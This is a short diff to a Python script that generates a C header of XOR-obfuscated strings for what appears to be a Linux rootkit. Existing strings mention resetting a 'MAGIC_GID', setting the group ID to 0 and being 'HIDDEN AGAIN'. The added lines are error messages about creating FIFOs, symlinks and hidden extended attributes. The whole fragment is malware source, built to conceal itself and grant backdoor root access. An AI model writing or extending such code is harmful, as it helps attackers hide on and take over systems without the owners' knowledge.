@@ -247,6 +247,9 @@ def const_h_setup():
     const_h += '#define X_USAGE "' + xor("Usage: %s [pw] [%s] [pkg name]\n") + '"\n' # template string used for snprintf in busage function
     const_h += '#define E_SMSG "' + xor("%s FINISHED AND MAGIC_GID RESET. \033[1;32mWE'RE HIDDEN AGAIN\033[0m\n") + '"\n' # message used after successful command executions
     const_h += '#define GID_SET "' + xor("SETTING GID TO 0\n") + '"\n'
+    const_h += '#define FIFO_ERR "' + xor("Couldn't create new FIFO file.\n") + '"\n'
+    const_h += '#define LN_ERR "' + xor("Couldn't create symlink to %s.\n") + '"\n'
+    const_h += '#define X_ERR "' + xor("Couldn't assign hidden extended attributes to FIFO link.\n") + '"\n'
 
     const_h += '#define XATTR "' + xor("user.%s") + '"\n'
 
